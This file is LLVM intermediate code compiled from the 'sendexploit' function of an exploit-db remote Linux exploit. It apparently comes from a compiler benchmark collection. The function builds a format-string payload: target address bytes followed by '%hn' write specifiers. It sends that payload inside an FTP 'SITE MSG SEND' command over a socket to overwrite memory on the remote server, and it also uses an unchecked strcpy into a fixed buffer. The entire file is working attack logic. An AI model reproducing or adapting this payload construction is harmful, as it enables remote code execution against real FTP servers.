; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_372.c_sendexploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_372.c_sendexploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32 }

@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str = private unnamed_addr constant [2 x i8] c"_\00", align 1
@.str.1 = private unnamed_addr constant [41 x i8] c"%c%c%c%c%c%c%c%c%%%du%%18$hn%%%du%%19$hn\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"SITE MSG SEND %s %s%s\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"[*] len: %d, sending code [%s]\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @sendexploit(i32 %0, i8* %1, i32 %2, i8* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca [68 x i8], align 16
  %12 = alloca [68 x i8], align 16
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i8* %3, i8** %8, align 8
  %19 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %19, i64 %21
  %23 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 4
  %25 = ashr i32 %24, 16
  %26 = and i32 %25, 65535
  %27 = trunc i32 %26 to i16
  store i16 %27, i16* %13, align 2
  %28 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %28, i64 %30
  %32 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %31, i32 0, i32 0
  %33 = load i32, i32* %32, align 4
  %34 = and i32 %33, 65535
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %14, align 2
  %36 = load i16, i16* %13, align 2
  %37 = zext i16 %36 to i32
  %38 = load i16, i16* %14, align 2
  %39 = zext i16 %38 to i32
  %40 = icmp sgt i32 %37, %39
  br i1 %40, label %41, label %57

41:                                               ; preds = %4
  %42 = load i16, i16* %14, align 2
  store i16 %42, i16* %15, align 2
  %43 = load i16, i16* %13, align 2
  store i16 %43, i16* %16, align 2
  %44 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %45 = load i32, i32* %7, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %44, i64 %46
  %48 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i32 0, i32 1
  %49 = load i32, i32* %48, align 4
  store i32 %49, i32* %17, align 4
  %50 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i64 %52
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %53, i32 0, i32 1
  %55 = load i32, i32* %54, align 4
  %56 = add nsw i32 %55, 2
  store i32 %56, i32* %18, align 4
  br label %73

57:                                               ; preds = %4
  %58 = load i16, i16* %13, align 2
  store i16 %58, i16* %15, align 2
  %59 = load i16, i16* %14, align 2
  store i16 %59, i16* %16, align 2
  %60 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %61 = load i32, i32* %7, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %60, i64 %62
  %64 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %63, i32 0, i32 1
  %65 = load i32, i32* %64, align 4
  %66 = add nsw i32 %65, 2
  store i32 %66, i32* %17, align 4
  %67 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %67, i64 %69
  %71 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %70, i32 0, i32 1
  %72 = load i32, i32* %71, align 4
  store i32 %72, i32* %18, align 4
  br label %73

73:                                               ; preds = %57, %41
  %74 = load i8*, i8** %8, align 8
  %75 = icmp ne i8* %74, null
  br i1 %75, label %76, label %80

76:                                               ; preds = %73
  %77 = getelementptr inbounds [68 x i8], [68 x i8]* %11, i64 0, i64 0
  %78 = load i8*, i8** %8, align 8
  %79 = call i32 @strcpy(i8* %77, i8* %78)
  br label %80

80:                                               ; preds = %76, %73
  %81 = getelementptr inbounds [68 x i8], [68 x i8]* %11, i64 0, i64 0
  %82 = call i32 @strlen(i8* %81)
  %83 = icmp slt i32 %82, 32
  br i1 %83, label %84, label %93

84:                                               ; preds = %80
  br label %85

85:                                               ; preds = %88, %84
  %86 = getelementptr inbounds [68 x i8], [68 x i8]* %11, i64 0, i64 0
  %87 = call i32 @strcat(i8* %86, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  br label %88

88:                                               ; preds = %85
  %89 = getelementptr inbounds [68 x i8], [68 x i8]* %11, i64 0, i64 0
  %90 = call i32 @strlen(i8* %89)
  %91 = icmp slt i32 %90, 32
  br i1 %91, label %85, label %92

92:                                               ; preds = %88
  br label %93

93:                                               ; preds = %92, %80
  %94 = getelementptr inbounds [68 x i8], [68 x i8]* %11, i64 0, i64 0
  %95 = call i32 @strlen(i8* %94)
  %96 = add nsw i32 %95, 16
  %97 = load i16, i16* %15, align 2
  %98 = zext i16 %97 to i32
  %99 = sub nsw i32 %98, %96
  %100 = trunc i32 %99 to i16
  store i16 %100, i16* %15, align 2
  %101 = getelementptr inbounds [68 x i8], [68 x i8]* %12, i64 0, i64 0
  %102 = load i32, i32* %17, align 4
  %103 = and i32 %102, 255
  %104 = load i32, i32* %17, align 4
  %105 = ashr i32 %104, 8
  %106 = and i32 %105, 255
  %107 = load i32, i32* %17, align 4
  %108 = ashr i32 %107, 16
  %109 = and i32 %108, 255
  %110 = load i32, i32* %17, align 4
  %111 = ashr i32 %110, 24
  %112 = and i32 %111, 255
  %113 = load i32, i32* %18, align 4
  %114 = and i32 %113, 255
  %115 = load i32, i32* %18, align 4
  %116 = ashr i32 %115, 8
  %117 = and i32 %116, 255
  %118 = load i32, i32* %18, align 4
  %119 = ashr i32 %118, 16
  %120 = and i32 %119, 255
  %121 = load i32, i32* %18, align 4
  %122 = ashr i32 %121, 24
  %123 = and i32 %122, 255
  %124 = load i16, i16* %15, align 2
  %125 = zext i16 %124 to i32
  %126 = load i16, i16* %16, align 2
  %127 = zext i16 %126 to i32
  %128 = load i16, i16* %15, align 2
  %129 = zext i16 %128 to i32
  %130 = sub nsw i32 %127, %129
  %131 = sub nsw i32 %130, 48
  %132 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %101, i32 68, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0), i32 %103, i32 %106, i32 %109, i32 %112, i32 %114, i32 %117, i32 %120, i32 %123, i32 %125, i32 %131)
  %133 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %134 = load i8*, i8** %6, align 8
  %135 = getelementptr inbounds [68 x i8], [68 x i8]* %11, i64 0, i64 0
  %136 = getelementptr inbounds [68 x i8], [68 x i8]* %12, i64 0, i64 0
  %137 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %133, i32 4096, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0), i8* %134, i8* %135, i8* %136)
  %138 = getelementptr inbounds [68 x i8], [68 x i8]* %11, i64 0, i64 0
  %139 = call i32 @strlen(i8* %138)
  %140 = getelementptr inbounds [68 x i8], [68 x i8]* %12, i64 0, i64 0
  %141 = call i32 @strlen(i8* %140)
  %142 = add nsw i32 %139, %141
  %143 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %144 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0), i32 %142, i8* %143)
  %145 = load i32, i32* %5, align 4
  %146 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %147 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %148 = call i32 @strlen(i8* %147)
  %149 = call i32 @write(i32 %145, i8* %146, i32 %148)
  ret i32 %149
}

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, ...) #1

declare dso_local i32 @printf(i8*, i32, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
